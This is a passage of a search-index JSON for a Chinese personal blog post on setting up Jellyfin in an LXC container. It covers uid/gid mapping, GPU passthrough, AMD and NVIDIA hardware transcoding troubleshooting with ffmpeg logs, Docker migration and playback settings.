uid,gid\u6620\u5c04","text":"<p>\u4e0d\u8fc7\u6b64\u65f6\uff0c\u5bb9\u5668\u5185\u7528\u6237\u521b\u5efa\u7684\u6587\u4ef6\u5728host\u4e0a\u7684\u6743\u9650\u4f1a\u5b58\u5728\u95ee\u9898\u3002\u67e5\u770b\u6620\u5c04\u76ee\u5f55\u7684\u6743\u9650\u4f1a\u53d1\u73b0\u5168\u662fnobody\uff08nobody uid\u548cgid\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a-1\uff0c\u537365534\uff09 <pre><code>drwxrwxr-x  1 nobody nogroup 1.9K Feb 16 12:34 Movie\ndrwxrwxr-x  1 nobody nogroup  368 Mar  2 23:21 TV\ndrwxrwxr-x  1 nobody nogroup 1.5K Feb 25 17:41 TV_anime\n</code></pre></p> <p>\u56e0\u6b64\u9700\u8981\u5c06host\u7528\u6237\u7684uid,gid\u6620\u5c04\u5230\u5bb9\u5668\u5185\u5bf9\u5e94\u7528\u6237\u7684uid,gid\u3002 - lxc\u5bb9\u5668\u5185\u6709\u8bb8\u591a\u7528\u6237\uff0c\u9ed8\u8ba4\u6709ubuntu(uid=1000,gid=1000)\u3002\u5982\u679c\u6211\u4eec\u9700\u8981\u6620\u5c04\u7ed9\u8be5\u7528\u6237\uff0c\u4f7f\u7528\u7b2c\u4e00\u884c\u547d\u4ee4\u5373\u53ef\u3002both\u8868\u793a\u540c\u65f6\u6620\u5c04uid\u548cgid\uff0c\u7b2c\u4e00\u4e2a1000\u8868\u793ahost\u7528\u6237id\uff0c\u7b2c\u4e8c\u4e2a1000\u8868\u793a\u5bb9\u5668\u5185\u7528\u6237id\u3002 - \u4f46\u662f\u7531\u4e8e\u6211\u4eec\u8fd0\u884cjellyfin\u7a0b\u5e8f\u4f7f\u7528\u7684\u662fjellyfin\u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u521b\u5efa\u7684\u6587\u4ef6\u4e5f\u662f\u4ee5jellyfin\u7528\u6237\u521b\u5efa\u7684\u3002\u56e0\u6b64\u8981\u6620\u5c04jellyfin\u7528\u6237\u3002\u800c\u8be5\u7528\u6237uid\u548cgid\u4e0d\u76f8\u7b49(uid=106,gid=112)\u3002\u56e0\u6b64\u9700\u8981\u4f7f\u7528\u7b2c\u4e8c\u6761\u547d\u4ee4\u3002\u53c2\u8003\uff1aCustom user mappings in LXD containers | St\u00e9phane Graber's website <pre><code>lxc config set ubuntu20 raw.idmap \"both 1000 1000\"\n\nprintf \"uid $(id -u) 106\\ngid $(id -g) 112\" | lxc config set ubuntu20 raw.idmap -\n</code></pre></p> <p>host\u4e0a\u8fd8\u9700\u8981\u8bbe\u7f6e<code>/etc/subuid,subgid</code>\uff0c\u4e00\u822c\u6765\u8bf4\u5176\u4e2d\u9ed8\u8ba4\u6dfb\u52a0\u4e86\u521b\u5efa\u7684\u7528\u6237\uff0c\u5e76\u4e14\u4e0d\u4f1a\u91cd\u53e0\u3002\u6ca1\u6709\u7684\u8bdd\uff0c\u624b\u52a8\u6dfb\u52a0\uff1a - \u4e0b\u9762\u8bbe\u7f6e\u8868\u793ayfy\u521b\u5efa\u7684namespace\uff0c\u5bb9\u5668\u5185\u7528\u62370-65536\u88ab\u6620\u5c04\u5230host\u4e0a\u7684100000-165536\uff08\u683c\u5f0f<code>user:first_id:count</code>\uff09 <pre><code>yfy:100000:65536\nroot:1000:1\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u7528\u6237\u6620\u5c04\u5b9e\u9a8c","title":"\u7528\u6237\u6620\u5c04\u5b9e\u9a8c","text":"<p>\u5bb9\u5668\u4e2d\u521b\u5efa\u4e0d\u540c\u6743\u9650\u6587\u4ef6 <pre><code>-rw-r--r--  1 nobody   nogroup     4 Mar  4 09:09 host-root.txt\n-rw-r--r--  1 jellyfin jellyfin    2 Mar  4 09:02 jellyfin.txt\n-rw-r--r--  1 root     root        6 Mar  4 08:16 root.txt\n-rw-r--r--  1 ubuntu   ubuntu      6 Mar  4 08:17 ubuntu.txt\n-rw-r--r--  1 yfy      yfy         2 Mar  4 09:04 yfy.txt\n\nroot:x:0:0:root:/root:/bin/bash\njellyfin:x:106:112:\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash\nyfy:x:1001:1001:,,,:/home/yfy:/bin/bash\n</code></pre></p> <p>\u5728host\u4e2d\u8bfb\u53d6\u5230\u7684\u6587\u4ef6\u6743\u9650 <pre><code>-rw-r--r-- 1 root    root       4  3\u6708  4 17:09 host-root.txt\n-rw-r--r-- 1 yfy     yfy        2  3\u6708  4 17:02 jellyfin.txt\n-rw-r--r-- 1 1000000 1000000    6  3\u6708  4 16:16 root.txt\n-rw-r--r-- 1 1001000 1001000    6  3\u6708  4 16:17 ubuntu.txt\n-rw-r--r-- 1 1001001 1001001    2  3\u6708  4 17:04 yfy.txt\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u6dfb\u52a0gpu","title":"\u6dfb\u52a0GPU","text":"<p>\u7ed9\u5bb9\u5668\u6dfb\u52a0gpu\u7c7b\u578b\u8bbe\u5907\uff1a <pre><code>devices:\n  rx550:\n    gid: \"109\"\n    type: gpu\n</code></pre></p> <p>\u6dfb\u52a0gpu\u540e\uff0c\u5bb9\u5668\u5185\u4f1a\u51fa\u73b0<code>/dev/dri/card0,renderD128</code>\u3002\u5982\u679c\u4e0d\u6307\u5b9agid\uff0c\u5219\u9ed8\u8ba4\u6743\u9650\u6240\u6709\u8005\u548c\u7ec4\u88ab\u8bbe\u7f6e\u6210root\uff0cjellyfin\u8fdb\u7a0b\u4f1a\u65e0\u6cd5\u8c03\u7528\u663e\u5361\u8fdb\u884c\u52a0\u901f\u3002</p> <p>\u56e0\u6b64\u9700\u8981\u8fdb\u5bb9\u5668\u67e5\u770brender\u7ec4\u7684gid\uff0c\u5e76\u5c06jellyfin\u7528\u6237\u6dfb\u52a0\u5230\u8be5\u7ec4\u3002\u7136\u540e\u5728\u6dfb\u52a0gpu\u8bbe\u5907\u65f6\u6307\u5b9agid\u3002 <pre><code># \u5bb9\u5668\u5185\u67e5\u770brender\u7ec4gid\ncat /etc/group\n#render:x:109:jellyfin\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5404\u79cd\u786c\u4ef6\u52a0\u901f","title":"\u5404\u79cd\u786c\u4ef6\u52a0\u901f","text":"<p>\u770breadme\u6587\u6863\u4ecb\u7ecd\uff1alinuxserver/docker-jellyfin (github.com)</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#amdgpu\u9a71\u52a8","title":"amdgpu\u9a71\u52a8","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#opencl-tone-mapping","title":"OpenCL tone-mapping","text":"<p>amd gpu\u9700\u8981\u4f7f\u7528opencl\u52a0\u901f\u8272\u8c03\u6620\u5c04\uff0c\u56e0\u6b64\u9700\u8981\u5b89\u88c5opencl\u8fd0\u884c\u65f6\u3002</p> <p>amdgpu-install</p> <ol> <li>\u5b98\u7f51\u4e0b\u8f7d\u201d\u9a71\u52a8\u201c\uff08deb\u6587\u4ef6\uff0c\u53ea\u5305\u542b\u4e00\u4e2aamdgpu-install\u811a\u672c\uff0c\u901a\u8fc7\u8be5\u811a\u672c\u8fdb\u884c\u9a71\u52a8\u5b89\u88c5\uff09</li> <li>\u5b89\u88c5AMDGPU\u8f6f\u4ef6\u6808\uff1a\u6709\u5b8c\u5168\u5f00\u6e90\u7248\u672c\uff0c\u6709\u4e9b\u7ec4\u4ef6\u4e5f\u6709Proprietary\u7248\u672c\u3002\u4e00\u4e9b\u7ec4\u4ef6\uff08opencl, vulkan\uff09\u662f\u53ef\u9009\u7684</li> <li>opencl\u6709\u4e24\u4e2a\u5b9e\u73b0\uff0c\u5176\u4e2drx550\u9700\u8981\u5b89\u88c5legacy\u7248\u672c\uff08\u975e\u5f00\u6e90\uff09<ul> <li>ROCr OpenCL stack, supports Vega 10 and later products</li> <li>Legacy OpenCL stack (Proprietary), supports legacy products older than Vega 10</li> </ul> </li> </ol> <pre><code>amdgpu-install -y --accept-eula --usecase=workstation --opencl=legacy --no-32\n</code></pre> <pre><code>amdgpu-install -y --accept-eula --usecase=graphics   # install the All-Open components\n\namdgpu-install -y --accept-eula --usecase=workstation --vulkan=pro --opencl=legacy\n</code></pre> <ul> <li>ROCr: Provides support for\u00a0Vega 10\u00a0and newer hardware.</li> <li>Legacy: Provides support for hardware older than\u00a0Vega 10.     (Proprietary, requires EULA acceptance)</li> </ul> <p>opengl: default opencl</p> Option Description <code>--opencl=rocr</code> Installs ROCr OpenCL. <code>--opencl=legacy</code> Installs legacy OpenCL. (Proprietary) <code>--opencl=rocr,legacy</code> Installs both ROCr and legacy OpenCL. <p>vulkan</p> Option Description <code>--vulkan=amdvlk</code> Installs open source Vulkan <code>--vulkan=pro</code> Installs PRO Vulkan (Proprietary) <code>--vulkan=amdvlk,pro</code> Installs both open and PRO Vulkan. #### AMD AMF <p>As of\u00a0Jellyfin 10.8\u00a0full OpenCL based hardware filtering in AMF is supported on Windows 10 and newer. AMD has not implemented the Vulkan based HW decoder and scaler in ffmpeg, the decoding speed may not be as expected on Linux. The closed source driver\u00a0<code>amdgpu-pro</code>\u00a0is required when using AMF on Linux.</p> <p>\uff08\u5f85\u89e3\u51b3\uff09\u6ca1\u6709\u5b9e\u73b0\u5728linux\u4e0b\u4f7f\u7528amd amf\u8fdb\u884c\u786c\u4ef6\u52a0\u901f\u3002 <pre><code>[h264_amf @ 0x562d7fd98040] DLL libamfrt64.so.1 failed to open\nError initializing output stream 0:0 -- Error while opening encoder for output stream #0:0 - maybe incorrect parameters such as bit_rate, rate, width or height\nmalloc_consolidate(): invalid chunk size\n</code></pre></p> <p>\u53c2\u8003\uff1aJellyfin 10.5.5 Docker VAAPI hardware transcoding issues \u00b7 Issue #3580 \u00b7 jellyfin/jellyfin (github.com)</p> <p>[Parsed_scale_vaapi_2 @ 0x563e3af4e980] Failed to render parameter buffer: 6 (invalid VASurfaceID).<code>Mesa 20.1 or higher is required to enable VAAPI to transcode HEVC videos on AMD GPU.</code>[h264_amf @ 0x5590871d0280] DLL libamfrt64.so.1 failed to open<code>AMD AMF hasn't support any native hw decoder. To use AMF encoding on Ubuntu, you need to manually install</code>amdgpu-pro<code>and</code>amf-amdgpu-pro`.</p> <pre><code>Stream mapping:\n  Stream #0:0 -&gt; #0:0 (hevc (native) -&gt; h264 (h264_amf))\n  Stream #0:1 -&gt; #0:1 (dts (dca) -&gt; aac (libfdk_aac))\nPress [q] to stop, [?] for help\n[h264_amf @ 0x55dbac31ad40] encoder-&gt;Init() failed with error 7\nError initializing output stream 0:0 -- Error while opening encoder for output stream #0:0 - maybe incorrect parameters such as bit_rate, rate, width or height\n[libfdk_aac @ 0x55dbac304c80] 2 frames left in the queue on closing\nConversion failed!\n</code></pre>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#nvidia-gpu_1","title":"nvidia gpu","text":"<p>\u8981\u6c42 - host\u5b89\u88c5nvidia\u9a71\u52a8\uff08\u4e0d\u80fd\u4f7f\u7528\u5f00\u6e90\u9a71\u52a8\uff09 - lxc\u53ef\u4ee5\u8bbe\u7f6e\u4f7f\u7528nvidia.runtime\u3002 <pre><code>lxc config set ubuntu20 nvidia.runtime true\n</code></pre> - jellyfin\u4e2d\u8bbe\u7f6e\u4f7f\u7528Nvidia NVENC</p> <p>\u521a\u5f00\u59cb\u62a5\u9519\uff0c\u53d1\u73b0\u662f\u7f3a\u5c11libnvidia-encode, libnvidia-decode\u4e24\u4e2a\u5e93\u3002\u5728host\u4e2d\u5b89\u88c5\uff0c\u4f46\u662f\u663e\u793a\u5df2\u7ecf\u5b89\u88c5\u4e86\u3002 \u4e8e\u662f\u5c1d\u8bd5\u5728lxc\u5bb9\u5668\u4e2d\u5b89\u88c5\uff0c\u4f46\u662f\u53d1\u73b0\u8c8c\u4f3c\u5df2\u7ecf\u5b89\u88c5\u4e86\u3002\u4e4b\u540e\u91cd\u542flxc\u5bb9\u5668\u4e0d\u77e5\u4e3a\u4f55\u5c31\u6ca1\u6709\u95ee\u9898\u4e86\u3002 <pre><code>Stream mapping:\n  Stream #0:0 (hevc) -&gt; setparams:default (graph 0)\n  Stream #0:7 (pgssub) -&gt; scale:default (graph 0)\n  overlay:default (graph 0) -&gt; Stream #0:0 (h264_nvenc)\n  Stream #0:1 -&gt; #0:1 (truehd (native) -&gt; aac (libfdk_aac))\nPress [q] to stop, [?] for help\n[matroska,webm @ 0x563cc2ae6200] sub2video: using 1920x1791 canvas\n[h264_nvenc @ 0x563cc2c89880] Cannot load libnvidia-encode.so.1\n[h264_nvenc @ 0x563cc2c89880] The minimum required Nvidia driver for nvenc is 470.57.02 or newer\nError initializing output stream 0:0 -- Error while opening encoder for output stream #0:0 - maybe incorrect parameters such as bit_rate, rate, width or height\n[libfdk_aac @ 0x563cc2c89140] 2 frames left in the queue on closing\nConversion failed!\n</code></pre></p> <pre><code>/usr/lib/jellyfin-ffmpeg/ffmpeg -analyzeduration 200M -init_hw_device cuda=cu:0 -filter_hw_device cu -hwaccel cuda -hwaccel_output_format cuda -c:v h264_cuvid -autorotate 0 -i file:\"/media/Movie/\u7eff\u76ae\u4e66 (2018)/\u7eff\u76ae\u4e66 (2018) - 1080p.mkv\" -autoscale 0 -map_metadata -1 -map_chapters -1 -threads 0 -map 0:0 -map 0:1 -map -0:s -codec:v:0 h264_nvenc -preset p1 -b:v 14360000 -maxrate 14360000 -bufsize 28720000 -profile:v:0 high -g:v:0 72 -keyint_min:v:0 72 -vf\n\n[h264_cuvid @ 0x5561f7fa97c0] Cannot load libnvcuvid.so.1\n[h264_cuvid @ 0x5561f7fa97c0] Failed loading nvcuvid.\nStream mapping:\n  Stream #0:0 -&gt; #0:0 (h264 (h264_cuvid) -&gt; h264 (h264_nvenc))\n  Stream #0:1 -&gt; #0:1 (ac3 (native) -&gt; aac (libfdk_aac))\nError while opening decoder for input stream #0:0 : Operation not permitted\n</code></pre> <p>\u53d1\u73b0\u8f6c\u7801\u6027\u80fd\u5f3a\u7684\u4e00\u6279\uff0c\u770b\u5230\u7684\u90fd\u662f400\uff0c200\u5e27\u7684\u8f6c\u7801\u901f\u7387\u3002</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#linux\u8fc1\u79fb\u5230docker","title":"linux\u8fc1\u79fb\u5230docker","text":"<p>Migrating | Jellyfin</p> <pre><code>version: '3'\nservices:\n  jellyfin:\n    image: jellyfin/jellyfin\n    user: &lt;uid&gt;:&lt;gid&gt;\n    network_mode: 'host'\n    restart: 'unless-stopped'\n    environment:\n      - JELLYFIN_CACHE_DIR=/var/cache/jellyfin\n      - JELLYFIN_CONFIG_DIR=/etc/jellyfin\n      - JELLYFIN_DATA_DIR=/var/lib/jellyfin\n      - JELLYFIN_LOG_DIR=/var/log/jellyfin\n    volumes:\n      - /etc/jellyfin:/etc/jellyfin\n      - /var/cache/jellyfin:/var/cache/jellyfin\n      - /var/lib/jellyfin:/var/lib/jellyfin\n      - /var/log/jellyfin:/var/log/jellyfin\n      - &lt;path-to-media&gt;:&lt;path-to-media&gt;\n</code></pre> <p>\u9700\u8981\u5907\u4efd\u6570\u636e\u5305\u542b4\u90e8\u5206 <pre><code>      - /var/lib/docker/docker_data/jellyfin/cache:/var/cache/jellyfin\n      - /var/lib/docker/docker_data/jellyfin/log:/var/log/jellyfin\n      - /var/lib/docker/docker_data/jellyfin/data:/var/lib/jellyfin\n      - /var/lib/docker/docker_data/jellyfin/etc:/etc/jellyfin\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#jellyfin\u8bbe\u7f6e","title":"jellyfin\u8bbe\u7f6e","text":"<p>\u4e00\u4e9b\u7ecf\u9a8c - \u6539\u53d8jellyfin\u8f6c\u7801\u8bbe\u7f6e\uff0c\u662f\u7acb\u5373\u751f\u6548\u7684\uff0c\u65e0\u9700\u91cd\u542fdocker - \u5b9e\u6d4bRX550\u7684\u8584\u5f31GPU\u6027\u80fd\uff0c\u52fe\u9009HEVC 10bit\u89e3\u7801\uff0c\u53cd\u800c\u4f1a\u62d6\u7d2f\u7f16\u7801\u8fc7\u7a0b\uff0c\u5e27\u6570\u66f4\u4f4e\u3002</p> <p>Settings =&gt; \u9996\u9875 - \u53ef\u4ee5\u8c03\u6574\u5a92\u4f53\u5e93\u663e\u793a\u987a\u5e8f - \u53ef\u4ee5\u5c06\u4e0d\u540c\u5a92\u4f53\u5e93\u7ec4\u5408\u6210\u4e00\u4e2a\u663e\u793a \u64ad\u653e - \u97f3\u9891\u9009\u62e9\uff1a\u64ad\u653e\u9ed8\u8ba4\u97f3\u9891 - \u5bb6\u5ead\u7f51\u7edc\u8d28\u91cf\uff1a\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u4e32\u6d41\u7801\u7387\uff0c\u598220Mbps - \u4f18\u5148\u4f7f\u7528 fMP4-HLS \u5a92\u4f53\u5bb9\u5668\uff1a\u4e0d\u77e5\u9053\u5982\u4f55\u751f\u6548</p> <p>\u4f18\u5148\u4f7f\u7528 fMP4 \u4f5c\u4e3a HLS \u64ad\u653e\u7684\u9ed8\u8ba4\u5bb9\u5668\uff0c\u4ece\u800c\u53ef\u4ee5\u5728\u652f\u6301\u7684\u8bbe\u5907\u4e0a\u76f4\u63a5\u4e32\u6d41 HEVC \u683c\u5f0f\u7684\u5185\u5bb9</p> <p>\u5b57\u5e55 - \u5b57\u5e55\u504f\u597d\uff1a\u504f\u597d\u5b57\u5e55\uff0c\u4e0b\u9762\u5b57\u5e55\u6a21\u5f0f\u9700\u8981\u4f7f\u7528 - \u5b57\u5e55\u6a21\u5f0f\uff1a\u63a8\u8350\u8bbe\u7f6e\u4e3a\u603b\u662f\u663e\u793a   - \u667a\u80fd\uff1a\u97f3\u9891\u4e3a\u5916\u8bed\u65f6\uff0c\u52a0\u8f7d\u504f\u597d\u5b57\u5e55\uff0c\u5426\u5219\u65e0\u5b57\u5e55\u3002\u4e0d\u592a\u9002\u7528\uff0c\u56e0\u4e3a\uff1a1 \u591a\u97f3\u9891\u65f6\u65e0\u6548\uff0c2 \u5373\u4f7f\u662f\u4e2d\u6587\u89c6\u9891\uff0c\u6700\u597d\u4e5f\u6709\u5b57\u5e55   - \u603b\u662f\u663e\u793a\uff1a\u663e\u793a\u504f\u597d\u5b57\u5e55\u3002\u9002\u7528\u6027\u6700\u597d\uff0c\u5f53\u6709\u504f\u597d\u5b57\u5e55\u65f6\u4f1a\u9009\u62e9\u504f\u597d\uff0c\u6ca1\u6709\u65f6\u9009\u62e9\u9ed8\u8ba4\u3002   - \u9ed8\u8ba4\uff1a\u6839\u636e\u5143\u6570\u636e\u4e2d\u201c\u9ed8\u8ba4\u201d\uff0c\u201c\u5f3a\u5236\u201d\u6765\u663e\u793a\u5b57\u5e55\u3002\u53ef\u4ee5\u770b\u4f5c\u603b\u662f\u663e\u793a\u7684\u5b50\u96c6   - \u5f3a\u5236\uff1a\u6839\u636e\u5143\u6570\u636e\u4e2d\u201c\u5f3a\u5236\u201d\u6765\u663e\u793a\u5b57\u5e55   - \u65e0\u5b57\u5e55 - \u662f\u5426\u70e7\u5f55\u5b57\u5e55   - \u81ea\u52a8\uff1a\u56fe\u7247\u683c\u5f0f\u6216\u590d\u6742ass/ssa\u5b57\u5e55\uff08\u5ba2\u6237\u7aef\u53ef\u80fd\u4e0d\u652f\u6301\u663e\u793a\uff09 p.s \u5efa\u8bae\u4ee5\u540e\u652f\u6301\u4e00\u79cd\u66f4\u7075\u6d3b\u7684\u8bbe\u7f6e\u65b9\u6cd5\uff1a\u65e0\u5b57\u5e55\uff0c\u97f3\u9891\u5339\u914d\u504f\u597d\u5219\u65e0\u5b57\u5e55\uff0c\u504f\u597d\u5b57\u5e55\uff0c\u9ed8\u8ba4\uff0c\u5f3a\u5236\u3002\u901a\u8fc7\u8c03\u8282\u8fd9\u51e0\u4e2a\u9009\u9879\u7684\u987a\u5e8f\u6765\u5b9e\u73b0\u4e0d\u540c\u7b56\u7565</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u786c\u4ef6\u52a0\u901f","title":"\u786c\u4ef6\u52a0\u901f","text":"<p>\u53c2\u8003\uff1aHardware Acceleration | Jellyfin</p> <p>Jellyfin supports\u00a0hardware acceleration (HWA) of video encoding/decoding using FFMpeg. FFMpeg and Jellyfin can support multiple hardware acceleration implementations such as Intel Quicksync (QSV), AMD AMF and NVIDIA NVENC/NVDEC through Video Acceleration APIs.</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5e38\u89c1\u89c6\u9891\u7f16\u7801","title":"\u5e38\u89c1\u89c6\u9891\u7f16\u7801","text":"<ul> <li>H.264/h264/AVC</li> <li>Profile: High 10 = H.264 10bit\uff1a\u76ee\u524d\u6ca1\u6709\u786c\u4ef6\u652f\u6301h264 10bit\u89e3\u7801</li> <li>H.265/HEVC</li> <li>Profile: Main, Main 10</li> </ul>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u6d4f\u89c8\u5668\u652f\u6301\u7684\u7f16\u7801","title":"\u6d4f\u89c8\u5668\u652f\u6301\u7684\u7f16\u7801","text":"<p>Codec Support | Jellyfin</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u4e0d\u540c\u786c\u4ef6\u652f\u6301","title":"\u4e0d\u540c\u786c\u4ef6\u652f\u6301","text":"<p>\u4e0d\u540c\u663e\u5361\u5bf9\u5e94\u652f\u6301\u7684\u786c\u4ef6\u7f16\u89e3\u7801API\uff1a - NVIDIA: NVENC - AMD: AMF, VA-API - Intel: QSV, VA-API - Apple: VideoToolbox - RPi: V4L2</p> <p>\u4e0d\u540c\u65b9\u6848\u53c2\u8003\uff1a CPU\u7f16\u89e3\u7801: h265 -&gt; h264 GPU\u7f16\u89e3\u7801\uff1ah265 -&gt; GPU -&gt; \u4e2d\u95f4\u5e27 -&gt; GPU -&gt; h254 CPU\u89e3\u7801\uff0cGPU\u7f16\u7801\uff1ah265 10bit -&gt; CPU -&gt; \u4e2d\u95f4\u5e27 -&gt; GPU -&gt; h254</p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u6d4b\u8bd5\u65b9\u6cd5","title":"\u6d4b\u8bd5\u65b9\u6cd5","text":"<p>\u8c03\u8bd5\u65f6\uff0c\u53ef\u4ee5\u4ecejellyfin\u65e5\u5fd7\u4e2d\u628a\u547d\u4ee4\u590d\u5236\u4e0b\u6765\uff0c\u6765\u5feb\u901f\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5de5\u4f5c\u6b63\u5e38\u3002 - vaapi\u6d4b\u8bd5 <pre><code>ffmpeg -init_hw_device vaapi=va:/dev/dri/renderD128\n</code></pre></p> <pre><code># Check the QSV and VA-API codecs\ndocker exec -it jellyfin /usr/lib/jellyfin-ffmpeg/vainfo\n\n# Check the OpenCL runtime status\ndocker exec -it jellyfin /usr/lib/jellyfin-ffmpeg/ffmpeg -v verbose -init_hw_device vaapi=va -init_hw_device opencl@va\n</code></pre> <p>\u8c03\u7528VA-API\u5931\u8d25\uff08/dev/dri/renderD128\u6743\u9650\u9519\u8bef\u5bfc\u81f4\uff09 <pre><code>[AVHWDeviceContext @ 0x557d76500880] No VA display found for device /dev/dri/renderD128.\nDevice creation failed: -22.\nFailed to set value 'vaapi=va:/dev/dri/renderD128' for option 'init_hw_device': Invalid argument\nError parsing global options: Invalid argument\n</code></pre></p> <p>OpenCL\u8bbe\u5907\u6ca1\u627e\u5230\uff08\u5f00\u542ftone-mapping\u540e\uff0camd gpu\u9700\u8981\u5b89\u88c5opencl\u9a71\u52a8\uff09 <pre><code>[AVHWDeviceContext @ 0x56158f868900] No matching devices found.\nDevice creation failed: -19.\nFailed to set value 'opencl=ocl:0.0' for option 'init_hw_device': No such device\nError parsing global options: No such device\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#intel\u6838\u663e","title":"intel\u6838\u663e","text":"<p>Intel GPU | Jellyfin</p> <ul> <li>\u8f6c\u7801\uff1aQSV, VA-API</li> <li>HDR tonne mapping\uff1aQSV, OpenCL</li> </ul> <p>vainfo\u67e5\u770bQSV\u548cVA-API\u652f\u6301\u60c5\u51b5 - <code>iHD driver</code>\u00a0indicates support for the QSV and VA-API interfaces. - <code>i965 driver</code>\u00a0indicates only support for the VA-API interface, which should only be used on pre-Broadwell platforms. <pre><code>root@689728fac458:/# /usr/lib/jellyfin-ffmpeg/vainfo --display drm --device /dev/dri/renderD128\nTrying display: drm\nlibva info: VA-API version 1.19.0\nlibva info: Trying to open /usr/lib/jellyfin-ffmpeg/lib/dri/iHD_drv_video.so\nlibva info: Found init function __vaDriverInit_1_19\nlibva info: va_openDriver() returns 0\nvainfo: VA-API version: 1.19 (libva 2.19.0)\nvainfo: Driver version: Intel iHD driver for Intel(R) Gen Graphics - 23.3.2 (95dc859)\nvainfo: Supported profile and entrypoints\n      VAProfileNone                   : VAEntrypointVideoProc\n      VAProfileNone                   : VAEntrypointStats\n      VAProfileMPEG2Simple            : VAEntrypointVLD\n      VAProfileMPEG2Main              : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointVLD\n      VAProfileH264Main               : VAEntrypointEncSliceLP\n      VAProfileH264High               : VAEntrypointVLD\n      VAProfileH264High               : VAEntrypointEncSliceLP\n      VAProfileVC1Simple              : VAEntrypointVLD\n      VAProfileVC1Main                : VAEntrypointVLD\n      VAProfileVC1Advanced            : VAEntrypointVLD\n      VAProfileJPEGBaseline           : VAEntrypointVLD\n      VAProfileJPEGBaseline           : VAEntrypointEncPicture\n      VAProfileH264ConstrainedBaseline: VAEntrypointVLD\n      VAProfileH264ConstrainedBaseline: VAEntrypointEncSliceLP\n      VAProfileVP8Version0_3          : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointVLD\n      VAProfileHEVCMain               : VAEntrypointEncSliceLP\n      VAProfileHEVCMain10             : VAEntrypointVLD\n      VAProfileHEVCMain10             : VAEntrypointEncSliceLP\n      VAProfileVP9Profile0            : VAEntrypointVLD\n      VAProfileVP9Profile0            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile1            : VAEntrypointVLD\n      VAProfileVP9Profile1            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile2            : VAEntrypointVLD\n      VAProfileVP9Profile2            : VAEntrypointEncSliceLP\n      VAProfileVP9Profile3            : VAEntrypointVLD\n      VAProfileVP9Profile3            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain422_10         : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointVLD\n      VAProfileHEVCMain444            : VAEntrypointEncSliceLP\n      VAProfileHEVCMain444_10         : VAEntrypointVLD\n      VAProfileHEVCMain444_10         : VAEntrypointEncSliceLP\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5176\u5b83\u9009\u9879","title":"\u5176\u5b83\u9009\u9879","text":"<p>\u53cd\u4ea4\u9519\u65f6\u4f7f\u5e27\u7387\u7ffb\u500d</p> <p>\u6b64\u8bbe\u7f6e\u4f7f\u7528\u53bb\u9694\u884c\u65f6\u7684\u573a\u9891\uff0c\u901a\u5e38\u79f0\u4e3a Bob \u53bb\u9694\u884c\uff0c\u5b83\u5c06\u89c6\u9891\u7684\u5e27\u9891\u52a0\u500d\uff0c\u4ee5\u63d0\u4f9b\u5b8c\u6574\u7684\u8fd0\u52a8\u6548\u679c\uff0c\u5c31\u50cf\u5728\u7535\u89c6\u4e0a\u89c2\u770b\u9694\u884c\u89c6\u9891\u65f6\u770b\u5230\u7684\u90a3\u6837\u3002</p> <p>\u5141\u8bb8\u5b9e\u65f6\u63d0\u53d6\u5b57\u5e55\uff1a\u5efa\u8bae\u5173\u95ed</p> 